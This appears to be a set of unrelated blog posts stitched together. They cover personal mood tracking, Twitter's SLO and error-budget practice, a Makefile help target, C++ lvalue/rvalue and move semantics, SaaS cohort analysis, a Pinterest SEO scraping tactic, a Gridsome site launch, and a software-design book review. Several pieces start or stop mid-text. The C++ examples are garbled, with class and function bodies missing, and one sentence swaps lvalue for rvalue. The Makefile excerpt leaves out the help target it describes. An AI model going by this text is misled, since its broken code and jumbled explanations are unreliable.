<p>Notwithstanding the concerns about the accuracy of the data the way I collected it (upon reflection the morning after, all three data points for the previous day at the same time, and with vague definitions of the cutoffs between the three sections of the day) this is a really interesting graph to look at over a timescale like this. My favourite feature of the graph is the easily visible section in June 2019 where my evening mood is vastly better than my day and morning mood; this is because I was on holiday with my friends and in the days recovering from the hangovers caused by the evenings. There’s also the rise to almost universal happiness around the birth of my son and the accompanying few weeks of time at home, before the uncertainty and panic around COVID-19 in mid-March put an end to that.</p>

<p>I noticed that there was something interesting about this graph when I looked at it during an “end-of-year review” process at the end of 2019, so I decided to start tracking a few more metrics related to anxiety. The most interesting, and most striking I think, is the “state of my fingernails”. It’s a simple 0-10 scale.</p>

<p><img src="http://mtsolitary.com/assets/img/nails.png" alt="Fingernails"></p>

<p>I’m not very proud of it, but I’ve been biting my fingernails for as long as I can remember. It’s absolutely a manifestation of anxiety and tension and I’m very aware that during difficult or stressful periods of my life I bite my fingernails more. It’s a habit that I would very much like to be rid of and I hope that understanding it is the first step to being free of it.</p>

<hr>

<p>Of course, none of this means anything if you don’t have the ability and the drive to actually act on the things you observe. That’s the next step for me, to try and <em>improve</em> the metrics in these graphs over time, to use my synthesised understanding of my past to influence the topology of these graphs in the future. Maybe that’s just a long-winded way of saying “examining yourself”: looking at yourself critically and trying to do better, or at the very least understand when you could do better and why you didn’t. I hope this post will go some way to making me accountable to myself, and hope to revisit these metrics and whichever new ones I start collecting throughout my life once a year to see how things are going.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br><em>This is the second article of a two-part series. Click </em><a href="http://www.blameless.com/blog/twitters-reliability-journey"><em>here</em></a><em> for part 1 of the interview with Brian, Carrie, JP, and Zac to learn more about </em><a href="https://www.blameless.com/blog/twitters-reliability-journey"><em>Twitter’s SRE journey</em></a><em>.</em><br></p><p><a href="https://www.blameless.com/blog/twitters-reliability-journey">Previously</a>, we saw how SRE at Twitter has transformed their engineering practice to drive production readiness at scale. The concept of service level objectives (SLOs) and error budgets have been key to this transformation, as SLOs shape an organization’s ability to make data-oriented decisions around reliability. (Read <a href="https://www.blameless.com/how-slos-transformed-evernote/">here</a> for a definition of SLOs and how they transformed Evernote). Today, the Twitter team has invested in centralized tooling to measure, track, and visualize SLOs and their corresponding error budgets.&nbsp;<br></p><p>However, successfully implementing SLOs is far easier said than done. Many organizations have struggled with adoption for a number of reasons. Common obstacles include getting stakeholder buy-in, not knowing what (and how) to measure, and confusion over how to make SLOs actionable.&nbsp;&nbsp;<br></p><p>While the Twitter engineering team had laid a very strong foundation around observability and reliability, it took several important breakthroughs before SLOs began achieving broader adoption within the organization and the journey continues.<br></p><h3>The foundations for SLO</h3><p>Prior to SLOs, the engineers had used service level indicators (SLIs) for many years.&nbsp; The SLIs drew from Twitter’s extensive instrumentation of infrastructure and investments in their observability stack. Their observability stack provided a foundation for measuring service health with indicators such as success rate, latency, and throughput across their distributed service ecosystem. For example, the team would monitor the success rate for user-facing HTTP services, which they computed by looking at HTTP 500 errors versus total requests.&nbsp;<br></p><p>Integrating the SLIs with alerts and on-call rotations had been a core practice within their engineering teams for years.&nbsp; Additionally, their focus on incident management and postmortems has enabled them to continuously learn from their always evolving production ecosystem.<br></p><p>A significant inflection point came with embedding the concept of SLO within <a href="https://twitter.github.io/finagle/">Finagle</a>, Twitter’s RPC library, which is maintained by the Core Systems Libraries (CSL) team. As mentioned in the previous post, Finagle delivers reliability features such as load balancing, circuit breakers, failure detectors, and more, filling them inside every single piece of software that runs. In 2018, the CSL team made SLOs a first-class entity in the Twitter internal version of Finagle, creating a foundational API building block that is tied to a service boundary, which they call an objective. This was transformative in that it allowed the team to begin defining service-to-service interactions and modeling beyond just an alert, creating a programmatic definition that the team could now use to inform runtime decisions.&nbsp;<br></p><p>The Twitter team supported the implementation with proposals for projects and use cases that could use the SLO feature, and initially delivered the configuration as well as realtime per-instance measurement of SLOs.&nbsp;&nbsp;<br></p><p>In its initial phases, adoption of the feature was limited. Service owners could configure SLOs, but due to a lack of tooling and benefits automatically associated with turning SLOs on, there was little incentive to do so in context of other priorities.<br></p><p>Seeing this, the team invested in follow-up work. They began to build integrations and solutions for service owners on top of SLOs, such as load-shedding based on SLOs as they provided more useful context than a related metric like CPU throttling. Through piloting such enhancements, the appetite for adoption began to increase.&nbsp;<br></p><h3>Defining SLOs</h3><p>In thinking about how to define SLOs, the Twitter team typically begins by considering which features are key, and ensuring that they're well instrumented and understood.<br></p><p>It’s important to identify the signals that best reflect a critical user experience. Some signals for service success rate can provide color but are not so straightforward to interpret. For example, in analyzing the service error rate inside the data center, the client might retry those requests, making it a faulty datapoint to reason around what the true user success rate is.<br></p><p>Once the team sets a reasonable SLO at the top level, that will drive down through the services that a boundary depends on. Every service has a multitude of service dependencies, and thus the latency and success SLOs for all upstream and downstream services must all work together in context of the defined boundary. SLOs enable a more holistic way of measuring the whole call path.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 	</p><h3>A major turning point: tying SLOs to error budgets</h3><p>The introduction of error budgets marked another critical inflection point in Twitter’s adoption of SLOs. Error budgets make SLOs actionable and provide a different lens to understand a service over time, so they were an important follow-on feature after the original delivery of SLOs.&nbsp;<br></p><p>Error budgets look at the SLO over time, and thus have allowed the team to begin tracking performance by providing a historical view into how the service met objectives through different timeframes. The traditional metric view tends to be shortsighted, and can bury signals around valuable trends and opportunities. Instead of a dashboard that charts hundreds of metrics, error budgets become a forcing function to pick a few of the most important metrics, and get deeper into how and why they change over time.&nbsp;<br></p><p>An important note is that the team does not prescribe a fixed set of actions upon the exhaustion of the error budget. While error budgets can be a powerful tool, the true value has to resonate with engineering and product teams.&nbsp;<br></p><p>With the notion of “<a href="https://www.linkedin.com/pulse/netflixs-context-control-how-does-work-steve-urban/">context, not control</a>” (coined by Netflix), there is strong emphasis on empowering well-intentioned, capable teammates with visualizations and insights to allow them to make better decisions. In the same way, Twitter SREs apply ongoing experimentation to understand what other team members will view as valuable to measure. They understand that error budgets are more about giving team members good tools and context; there is no one policy fits all.&nbsp;&nbsp;<br></p><p>For example, one team hypothesized that the error budget would help inform when automated deploys could proceed, and specifically, whether to pause a deploy if the error budget was exhausted.&nbsp; But what they found was that sometimes the deploy being paused or blocked could contain the fix for the increased errors. Thus, that simple rule of “block deploys if no error budget remains” quickly began to fall apart. The very deploy getting blocked could decrease the volume or rate of errors, and possibly even defend the SLO and enable it to be met over its remaining duration of time.&nbsp;<br></p><p>Bearing in mind that they aren’t necessarily meant to be prescriptive, error budgets provide very useful suggestions for service owners in thinking about how to prioritize work. They create an important ‘runway’ for scaling the pace of innovation up or down. For example, overly rapid error budget burndown could be a sign to prioritize mitigation work for the current on-call or an upcoming sprint. Alternatively, not using enough of the error budget could nudge the team to iterate on feature work faster, or experiment more.&nbsp;</p><h3>The benefits of SLO</h3><p>While the team is still early in its adoption of SLOs, they’ve already seen the immense potential and value of SLOs in several ways.&nbsp;<br></p><p><strong><em>From a ‘distributed service zoo’ to a shared language</em></strong></p><p>Twitter has hundreds, if not thousands, of services, making its infrastructure a complex beast to understand. The current members of the Twitter Command Center (TCC) have been around long enough where they generally know what most of the services are and how services ‘snap together’. However, they know that eventually they will reach a point where that becomes impossible, where no one individual can grok how it all works. By investing in SLOs now to help guide discussions, the goal is that by the time they reach that point of un-knowable complexity, they will have set themselves up to manage service metrics programmatically.<br></p><p><strong><em>The right amount of context</em></strong></p><p>Context is the key. Dashboards can easily have hundreds of charts which translate into thousands of metrics. Teams might have tens or hundreds of alerts on their services across multiple data centers. These dashboards, metrics, and alerts are helpful for those running those services, but they're very high context, and information overload for anyone else.&nbsp;<br></p><p>SLOs create the ability to have more directed conversations with shared context. Instead of looking at a hundred pictures of a dashboard, the team can align on the four or five things that matter. lf any of those are not green, others can understand that something's not right without having to know anything else about the service.<br></p><p><strong><em>Dynamic load balancing and load shedding</em></strong></p><p>By making SLOs a first class entity, services can speak it at the programming level, beyond just measuring it. This enables the team to make systematic improvements using SLOs as a building block. For example, the team is exploring whether back pressure in Finagle can instead be SLO-based.<br></p><p>With Finagle, services can programmatically detect when they are under load (typically with second class signals such as CPU), and then signal to redirect traffic to another instance. Instead of relying on second class signals to implement back pressure, a service can directly know if it’s trending towards an SLO violation in order to signal back pressure and reduce load on itself.<br></p><p><strong><em>Graceful degradation</em></strong></p><p>One of the Twitter team’s goals for SLO is in gracefully degrading services during large-scale events to ensure that core functionality is always available. Rather than an all-or-nothing failure mode, the team aims to gracefully degrade services by stripping away peripheral features while maintaining core functionality.<br></p><p>The Twitter team is interested in utilizing SLOs to implement a selective circuit breaker pattern to …</p></div></div>

Then we can use <code>make install</code> and <code>make run</code> to execute those tasks.</p> <p>While target names like <code>install</code> are quite common, the problems arise when we have to deal with a lengthy <code>Makefile</code>, and we are not aware of all the available targets.</p> <p>Hopefully, with a slight modification of our current <code>Makefile</code> and the addition of a new target, we can expose this information and access it from the Terminal app. Let’s see how!</p> <p>First, we will have to document each of the existing targets. To do so, we will add a comment starting with <code>##</code> right after the target’s name.</p> <div><div><pre><code><span>install</span>: <span>## Install </span>
	@echo <span>"Installing..."</span>

run: <span>## Run</span>
	@echo <span>"Running..."</span>

</code></pre></div></div> <p>We will also set the <code>.PHONY</code> and the <code>.DEFAULT_GOAL</code> variables. The last one will make <code>help</code> the default target when running <code>make</code> without a specific target.</p> <p>Now, if we head back to the Terminal app, and run <code>make</code>, we will get the list of the documented targets as an output <img title=":rocket:" alt=":rocket:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png" height="20" width="20"></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>The concepts of lvalue and rvalue in C++ had been confusing to me ever since I started to learn C++. I did not fully understand the purpose and motivation of having these two concepts during programming and had not been using rvalue reference in most of my projects. Given most of the documentation on the topic of lvalue and rvalue on the Internet are lengthy and lack of concrete examples, I feel there could be some developers who have been confused as well.</p>



<p>In this blog post, I would like to introduce the concepts of lvalue and rvalue, followed by the usage of rvalue reference and its application in move semantics in C++ programming.</p>

<h3 id="lvalue-vs-rvalue">lvalue VS rvalue</h3>

<p>In C++, each expression, such as an operator with its operands, literals, and variables, has type and value. We could categorize each expression by type or value. Each expression is either lvalue (expression) or rvalue (expression), if we categorize the expression by value. Note that when we say lvalue or rvalue, it refers to the expression rather than the actual value in the expression, which is confusing to some people. So personally I would rather call an expression lvalue expression or rvalue expression, without omitting the word “expression”.</p>



<p>lvalue expression is so-called because historically it could appear on the left-hand side of an assignment expression, while rvalue expression is so-called because it could only appear on the right-hand side of an assignment expression. lvalue expression is associated with a specific piece of memory, the lifetime of the associated memory is the lifetime of lvalue expression, and we could get the memory address of it. rvalue expression might or might not take memory. Even if an rvalue expression takes memory, the memory taken would be temporary and the program would not usually allow us to get the memory address of it.</p>

<h4 id="example">Example</h4>

<div><div><pre><code><span>#include &lt;iostream&gt;

<span>class</span> <span>Foo</span>
<span>{</span>

    <span>{</span>

<span>};</span>

<span>}</span>

<span>int</span> <span>main</span><span>()</span>
<span>{</span>
    <span>int</span> <span>x</span> <span>=</span> <span>1</span><span>;</span> <span>// rvalue expression as a whole, x is lvalue expression, 1 is rvalue expression and has no memory associations</span>
    <span>Foo</span> <span>foo1</span><span>{</span><span>10</span><span>};</span> <span>// rvalue expression as a whole, foo1 is lvalue expression</span>
    <span>Foo</span> <span>foo2</span><span>{</span><span>20</span><span>};</span> <span>// rvalue expression as a whole, foo2 is lvalue expression</span>
    <span>foo1</span> <span>=</span> <span>Foo</span><span>();</span> <span>// rvalue expression as a whole, foo1 is lvalue expression, Foo() is rvalue expression and takes temporary memory</span>
    <span>foo1</span> <span>=</span> <span>foo2</span><span>;</span> <span>// rvalue expression as a whole, foo1 is lvalue expression</span>
    <span>printFoo1</span><span>(</span><span>foo1</span><span>);</span> <span>// rvalue expression as a whole, printFoo1 is lvalue expression</span>
    <span>printFoo2</span><span>(</span><span>foo1</span><span>);</span> <span>// rvalue expression as a whole, printFoo2 is lvalue expression</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>&amp;</span><span>printFoo1</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span> <span>// printFoo1 is lvalue expression and we could get the address of it</span>
<span>}</span>
</code></pre></div></div>

<h3 id="rvalue-reference">rvalue Reference</h3>

<p><code>T&amp;</code> is the operator for lvalue reference, and <code>T&amp;&amp;</code> is the operator for rvalue reference. Literally it means that lvalue reference accepts an lvalue expression and lvalue reference accepts an rvalue expression.</p>

<h4 id="example-1">Example</h4>

<div><div><pre><code><span>#include &lt;string&gt;
#include &lt;iostream&gt;
</span>

    <span>str_lref</span> <span>+=</span> <span>str_punc</span><span>;</span> <span>// str_lref is lvalue expression</span>
    <span>str_rref</span> <span>+=</span> <span>str_punc</span><span>;</span> <span>// str_rref is lvalue expression</span>

<span>}</span>
</code></pre></div></div>

<p>In this particular example, at first glance, the rvalue reference seems to be useless. Why would we bother to use rvalue reference given lvalue could do the same thing. In the next section, we would see that rvalue reference is used for move semantics which could potentially increase the performance of the program under some circumstances. We would also see that only by rvalue reference we could distinguish move semantics from copy semantics.</p>

<h3 id="move-semantics">Move Semantics</h3>

<p>In C++, we could create a new variable from another variable, or assign the value from one variable to another variable. To keep both variables “alive”, we would use copy semantics, i.e., copy one variable to another. In some scenarios, after assigning the value from one variable to another variable, the variable that gave the value would be no longer useful, so we would use move semantics.</p>



<p>Because move semantics does fewer memory manipulations compared to copy semantics, it is faster than copy semantics in general. Let’s take a look at the following example.</p>

<h4 id="example-2">Example</h4>

<div><div><pre><code><span>/*
 * move.cpp
 */</span>
<span>#include &lt;string&gt;
#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;chrono&gt;

<span>{</span>
<span>public:</span>
    <span>// Default constructor</span>
    <span>FooIncomplete</span><span>()</span>
    <span>{</span>
    <span>}</span>
    <span>// Non-default constructor</span>

<p>Cohort analysis is a method that allows you to break your data set into the specific groups, examine the lifecycle of each group, and compare them to each other.</p>

<p>It is a great way to find critical points within a customer lifecycle. You can use cohort analysis to understand if you are improving the provided service with time.</p>

<p>In the SaaS world, we usually use cohort analysis to get a deeper understanding of churn or customer retention.</p>

<h2 id="how-to-build-a-cohort">How to build a cohort</h2>

<p>Let's take a SaaS company that already has some customer base. The first step is to split the whole customer base into separate groups – cohorts. In SaaS, we usually group customers by the month they joined the service.</p>

<p>For example, in May 2019 our imaginary SaaS company had 120 new customers. This group of 120 customers will form one May 2019 cohort. Now, from these 120 customers, how many were still using the service as of the end of June 2019? Let’s say 100. From this 100 how many were left in July 2019? And so on. You keep asking this question till the current date.</p>

<p>Here is the progression of the May 2019 cohort.</p>

<p><img src="https://i.snap.as/7z7RCO4.png" alt=""></p>

<p>What can you understand by examining this one cohort? One thing is that within just 13 months the company loses 100 from 120 customers it started with. Certainly not the best performance. The biggest drop happens in Month 1 and Month 13. This is also very useful information. Perhaps it is so because the company sells monthly or yearly contracts.</p>

<p>The next step is to add newer cohorts. Customers joining in the month of June 2019 will form the June cohort and so on.</p>

<p>Here is the example of customer cohorts for our SaaS company:</p>

<p><img src="https://i.snap.as/DsxsSvW.png" alt=""></p>

<p>Once you have split your data set into cohorts with the number of customers,  you can use this data to calculate any SaaS metric to get a deeper understanding of them. Let’s see how we can do that on the example of customer churn, MRR churn, and customer retention.</p>

<h2 id="using-cohort-analysis-to-understand-customer-churn">Using cohort analysis to understand customer churn</h2>

<p>Having the cohorts with customers number is nice, but it is not very visual, and still requires a lot of digging into the numbers to understand what is going on.</p>

<p>Let’s use this data and examine customer churn. For each month of the cohort’s life, we have to calculate what % of customers were lost.</p>

<p>For example, in May 2019 we had 120 customers and only 100 of them were left after a month. So the churn for Month 1 will be:</p>

<p><code>(120 - 100) / 120 = 16%</code></p>

<p>When calculating churn for Month 2 we can do two things. We can either calculate it relative to the previous month like so:</p>

<p><code>(100 - 89) / 100 = 11%</code></p>

<p>Or we can calculate it relative to the Month 0:</p>

<p><code>(120 - 89) / 120 = 25%</code></p>

<p>These two approaches give you a slightly different picture. The first tells you churn at any given month of the cohort life. The second gives you an understanding of what percent of all customers from the given cohort (the month 0 number) were lost until the particular month.</p>

<p>For example, if we started with 120 customers, and in Month 3 churn relative to month 0 is 35% it means that we lost 42 customers already.</p>

<p><code>120 * .35 = 42</code></p>

<p>Let’s calculate churn relative to the previous month for all cohorts.</p>

<p><img src="https://i.snap.as/S5Bj15s.png" alt=""></p>

<p>We have added conditional formatting to highlight cells with higher churn and draw attention to them. This feature is available in Google Spreadsheets and Excel and is very useful when it comes to cohorts visualization.</p>

<p>Now you can clearly see at what month your churn is the highest.</p>

<h2 id="a-few-words-on-calculation-relative-to-month-0-vs-previous-month">A few words on calculation relative to month 0 VS previous month</h2>

<p>When looking at cohorts where percent is calculated relative to the previous month it is important to understand that higher percentages do not necessarily mean the highest number of lost customers. For example, losing 20 customers out of a 100 will result in a 20% churn with 20 customers lost, but losing 40 out of a 300 will result in a 13% churn with 40 customers lost. So the churn is lower but the number of lost customers is higher.</p>

<p>When presenting cohorts with percent calculation relative to the previous month it is always useful to pair it with cohorts showing pure numbers. So that a reader can easily understand what actual number a given percentage will convert.</p>

<p>You have to understand that the time on the cohort table is passing in two directions. From left to right – as each cohort progresses with its life. From top to the bottom – with each new cohort being added at the bottom.</p>

<p>This means two things:</p>
<ol><li>You would expect younger cohorts to perform better compared to the older once. As time passes, hopefully, you improve the service you provide. It becomes more mature. You sell to customers that are a better fit for your product.</li>
<li>You would expect a cohort to stabilize as more months pass. Hopefully, once customers have adopted your product they will stay with it for longer and will not churn at such a high rate as at the beginning of the lifecycle.</li></ol>

<p>Here is how we can apply this to churn cohorts:</p>

<p><img src="https://i.snap.as/9Xx3grt.png" alt=""></p>

<h2 id="using-cohort-analysis-to-understand-mrr-churn">Using cohort analysis to understand MRR churn</h2>

<p>You can use quite a few different metrics as a value for your cohort. MRR is a very good example. By calculating the MRR retention rate for each cohort you can easily understand not only where you lose the most of your money but also if you manage to grow revenue over the lifespan of the specific cohort.</p>

<p>Let’s take a look at the example below:</p>

<p><img src="https://i.snap.as/BHVoC8y.png" alt=""></p>

<p>You can see that in younger cohorts, specifically Feb 2020, Mar 2020, Apr 2020 our company managed to cover all MRR churn by expanding existing customers’ MRR. Thus achieving +100% MRR retention. These cohorts have more MRR in Month 2-4 than in Month 0. This is a great sign that you are doing something right and can expand your existing customer base.</p>

<h2 id="a-different-way-to-visualize-cohorts">A different way to visualize cohorts</h2>

<p>I want to describe one different way to visualize your cohort data. It gives you a good visual clue into the underlying patterns. The approach is to visualize your cohort as a multiple line chart.</p>

<p>Let’s take customer retention this time. We don’t really need to do any additional calculations here. It is the initial data we started our post with. From all customers that sign up in May 2019 how many left in June, and so on.</p>

<p>What we can do is instead of putting these data in the table, we can draw them as lines. The X-axis represents the lifecycle month of the cohort. The Y-axis represents the number of customers left in a given month of the lifecycle.</p>

<p>Here is the example of such visualization for our imaginary company:</p>

<p><img src="https://i.snap.as/ssFqV11.png" alt=""></p>

<p>When examining such visualization you want to look for three main things:</p>
<ol><li>Newer cohort lines should stay above the older cohort lines. That means that the new cohort has more customers and you are able to retain them better.</li>
<li>Hopefully, after the initial drop, the line will stabilize and go almost in parallel with the X-axes. It means that once customers adopt your product they stay with it and churn at a much lower rate than initially.</li>
<li>New lines should have a more shallow initial drop compared to the older ones. You can see on the example above how lines which are on top have much more shallow drops. This means that you are improving your service, and customers need less time to see its value.</li></ol>

<p>There are many different metrics you can use as a cohort value. We presented some of the most common ones.</p>

<p>I hope it was useful and if you have any questions or comments please feel free to reach out.</p>

<p>By <strong><a href="https://twitter.com/ryanbed">Ryan Bednar</a></strong> (CEO of <a href="https://www.rankscience.com/">RankScience</a>)</p>
<blockquote><p><span>Update</span>: This post got a ton of traffic on Hacker News today and&nbsp;Pinterest reached out to comment: “The claim that we scrape Google search results is false. We do not, and never have, scraped Google search results at any time.” The original article suggested Pinterest scrapes Google directly, but instead it seems more likely that Pinterest grabs data from Google through it’s Chrome Extension. We’ll update this post as we learn more from them.</p></blockquote>
<p>A few weeks ago in the Twitterverse, @SwiftOnSecurity <a href="https://twitter.com/SwiftOnSecurity/status/1258875333446717445" target="_blank" rel="noopener noreferrer">outed Pinterest</a> for using a somewhat surprising SEO tactic: for every image uploaded to Pinterest that doesn’t have any real metadata or description of the picture, Pinterest automatically performs a reverse image search on Google, scrapes all of the metadata and descriptions they can find for that image, and then uploads that content onto their site and pretends it’s from their own users.</p>
<p>This is interesting for a couple of reasons:</p>
<ul>
<li dir="ltr" role="presentation"><span>Google typically does not react kindly to anyone trying to scrape its results </span><i><span>for any reason</span></i><span>, so this is incredibly difficult to do at scale (across hundreds of millions of photos) without being blocked.</span></li>
<li dir="ltr" role="presentation"><span>Often when somewhat shady SEO tactics are exposed on Twitter, Google responds by issuing a manual action and penalizing the offending site in search results. This famously happened to </span><a href="https://marketingland.com/10-big-brands-that-were-penalized-by-google-69646"><span>Genius years ago as they were put in time-out</span></a><span> and told to re-evaluate their blackhat SEO strategy. </span></li>
<li dir="ltr" role="presentation"><span>Pinterest is a publicly traded company, so if they’re penalized it could hurt the company’s stock price ($PINS).</span></li>
</ul>
<p><i><span>Content relevance</span></i><span>&nbsp;is a ranking factor in Google. The closer semantically you can describe a topic or image to how Google understands it, the better your chances of ranking higher in their index. Will Google find this behavior flagrantly blackhat and respond accordingly? </span></p>

<h2><strong>Some background on Pinterest SEO</strong></h2>
<p><span>Pinterest has been super successful with SEO growth over the years. Their post on </span><a href="https://medium.com/pinterest-engineering/demystifying-seo-with-experiments-a183b325cf4c"><span>Demystifying SEO with Experiments</span></a><span> was particularly inspirational for me in deciding to start </span><a href="https://www.rankscience.com/"><span>RankScience</span></a><span>, an SEO automation and A/B testing company. So any time I hear about programmatic SEO tactics that work on a site as large as Pinterest, with 800M+ pages indexed in Google, I’m intrigued. This is obviously a strategy they would never talk about doing publicly, so it’s fascinating to see it exposed and called out like this.</span></p>
<h2><strong>So how exactly does this Pinterest SEO growth hack work?</strong></h2>
<ul>
<li><span>User uploads a photo to Pinterest without any meta data.</span></li>
<li><span>Pinterest performs a reverse image search on Google for that image.</span></li>
<li><span>Pinterest scrapes all the text captions for related photos that appear from Google.</span></li>
<li><span>Pinterest publishes these text captions under </span><b>What others are saying</b><span> on their own page.</span></li>
<li></li>
</ul>

<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png" alt="Pinterest SEO growth hack" width="504" height="652" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png 940w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-232x300.png 232w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-792x1024.png 792w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-768x993.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-600x776.png 600w" sizes="(max-width: 504px) 100vw, 504px"></p>

<p><span>Voila! Instant unique and scalable SEO text content that maps directly to Google’s understanding of the photo.&nbsp;</span><span>Google indexes the Pinterest page with the new text content and ranks it higher because of the strong relevance of the text on the page to its existing understanding of the photo.&nbsp;</span><span>Rinse and repeat across millions of photos.</span></p>
<h2><strong>The SEO community took notice:</strong></h2>
<h2><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png" alt="Pinterest SEO growth hack community reaction" width="478" height="191" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png 300w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-1024x410.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-768x307.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-600x240.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM.png 1334w" sizes="(max-width: 478px) 100vw, 478px"></h2>
<h2><strong>And what was Google’s response?</strong></h2>
<p><span>John Mu, Webmaster Trends Analyst at Google, and part of the webspam team responsible for policing SEO behavior, chimed in on the thread and offered support for the content available on Pinterest. He didn’t comment directly on this behavior, but I’d bet that the popularity of this thread alerted some people at Google and that there’s an investigation going on internally into this practice at Pinterest. ($PINS) The only reason that Google would let this slide is that they don’t view policing Image Search as high priority.</span></p>
<h2><b>How you can take advantage of Content Relevance to rank higher in Google</b></h2>
<p><span>Content relevance is an important ranking factor in Google search. It’s widely accepted that Google calculates relevance for individual URLs and pieces of content as they relate to a particular query or keyword, and that these quantitative relevance calculations play a role in its ranking algorithms. In the Pinterest example, they’re taking an image that Google already knows about and grabbing multiple text descriptions of that image from Google itself, then combining them in one place to provide one comprehensive page describing the image. This maps exactly to Google’s existing understanding of that image, so the page then likely achieves a very high content relevance score.</span></p>
<p><span>One way you can apply what Pinterest is doing to improve the rankings of content on your own site is to use a NLP method called </span><a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"><span>TF-IDF</span></a><span> (term frequency-inverse document frequency). This is a text analysis technique that helps reveal how important a word or phrase is to a document in a corpus (example: a collection of URLs). You can either break out a spreadsheet and do this by hand, or use an advanced content optimization tool like <a href="https://www.rankscience.com/seo-content-insights">RS Content Insights</a> to do this analysis at scale.&nbsp; </span></p>
<p><span>Let’s say that you wanted to rank in Google for </span><i><span>google image search seo</span></i><span>. We already know which documents Google thinks are the most relevant and highest authority for this search term because those are the pages that show up in search results. So we can start by downloading the top 25 URLs ranking in Google for </span><i><span>google image search seo</span></i><span> and performing tf–idf analysis across all of those documents to reveal key topic entities that are semantically related to the search term.</span></p>
<p><span>Here are the topic entities produced by TF-IDF when we ran this post that you’re reading right now through Content Insights for </span><i><span>google image search seo</span></i><span>.</span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png" alt="google image search seo" width="640" height="693" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png 946w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-277x300.png 277w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-768x831.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-600x649.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM.png 1388w" sizes="(max-width: 640px) 100vw, 640px"></p>
<p><span>You’ll see that TF-IDF analysis suggests using keywords like alt tags, alt text, image quality, file size, and stock photos, which are all associated with </span><i><span>google image search seo</span></i><span>, even though they are not replacements or alternatives to the keyword. This gets directly at Google’s understanding of the topic and using this method you can get your content ranking your post higher for having a better content relevance score — it’s often surprisingly effective. In addition to </span><a href="https://www.rankscience.com/coderwall-seo-split-test"><span>SEO A/B testing</span></a><span>, which everyone should be doing by now, using NLP and TF-IDF to refresh and update existing long-form content on your site is an incredibly effective way to grow search traffic and rankings in 2020, and an important tool in any marketing team’s tool kit.</span></p>

Posted 24. June 2020.
<strong>1 min read.</strong></p></div><div><div><div><p>Yesterday, I published my new website which has been created with <a href="https://gridsome.org/" title="Gridsome" target="_blank" rel="nofollow noopener noreferrer">Gridsome</a>. I had to reformat my blog posts and add tags to each of them. I have 156 posts, so this was not an easy task, to say the least.</p>
<p>Now I'm writing my first blog post using Forestry, and with any luck, it will post to my repository and deploy to my site with no issues. That's if I've set up the formatting correctly and everything else that comes with it.</p>
<p>I now have a newsletter which you can subscribe to using the form at the bottom of this post. Signing up is easy and it will make sure you never miss an update. However, if you're more of an RSS person, then I have that too.</p>
<p>There are a few more things I would like to add to my website such as comments that aren't by Disqus, social card metadata and an auto-generated sitemap. I should probably create a roadmap on my <a href="https://github.com/Michael-Brooks/michaelbrooks.co.uk" title="GitHub repository" target="_blank" rel="nofollow noopener noreferrer">GH repository</a> for you to keep an eye on.</p>
<p>That's pretty much it for this one, and if you like the new update please let me know on my <a href="https://twitter.com/MBrooksUK" target="_blank" rel="nofollow noopener noreferrer">Twitter page</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div><p>This review is largely in response to the article "<a href="https://qntm.org/clean">It's probably time to stop recommending Clean Code</a>", and the ensuing <a href="https://www.reddit.com/r/programming/comments/hhlvqq/its_probably_time_to_stop_recommending_clean_code/">Reddit discussion</a>.  A lot of really interesting points were brought up, but the big question that the author themself wasn't able to answer was: "What should we recommend instead?"</p>
<p>I believe the book we should be recommending is <em>A Philosophy of Software Design</em> by John Ousterhout.  In this post I want to spend a bit of time reviewing it and giving an overview of the contents, and then I want to explain why, in my opinion, it is such a good recommendation.</p>
<h2>An Empirical Philosophy Book</h2>
<p>The elevator pitch of John Ousterhout's book <em>A Philosophy of Software Design</em> is fairly simple: he is a university professor by profession (albeit one with almost two decades of experience in the "real world"), who each year teaches students how to actually design software in a practical, hands-on course where the students are expected to design and modify "a substantial piece of software" in an iterative way, hopefully understanding more about the practice of software design each time around.</p>
